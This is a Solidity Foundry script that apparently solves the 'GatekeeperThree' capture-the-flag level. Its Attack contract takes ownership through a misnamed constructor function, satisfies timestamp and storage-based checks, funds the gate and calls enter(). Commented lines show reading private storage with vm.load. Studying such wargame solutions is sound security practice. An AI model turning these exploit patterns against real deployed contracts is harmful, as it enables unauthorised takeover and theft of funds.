// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/GatekeeperThree.sol";

contract GatekeeperThreeSolve is Script {
    GatekeeperThree public gate = GatekeeperThree(payable(0x152e56fe5FEC16f910Ea83294dD321a0c8380193));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Gate Owner : ", gate.owner());


        
        // address trick = gate.trick().trick();
        // console.log("Trick Address : ", trick);
        // bytes32 _password = vm.load(trick, bytes32(uint(2)));
        // uint password = uint(_password);
        // console.log("Password : ", password);

        Attack attack = new Attack{value: 0.002 ether}();
        attack.exploit();
        
        console.log("Allow Entrance : ", gate.allowEntrance());
        console.log("Gate Owner : ", gate.owner());
        console.log("Entrant : ", gate.entrant());
        vm.stopBroadcast();
    }
}

contract Attack{
    GatekeeperThree public gate = GatekeeperThree(payable(0x152e56fe5FEC16f910Ea83294dD321a0c8380193));

    constructor() payable{}
    function exploit() public {
        gate.construct0r();

        gate.createTrick();
        gate.getAllowance(block.timestamp);

        (bool success, ) = payable(address(gate)).call{value : address(this).balance}("");
        require(success, "Tx Failed");

        gate.enter();

    }
}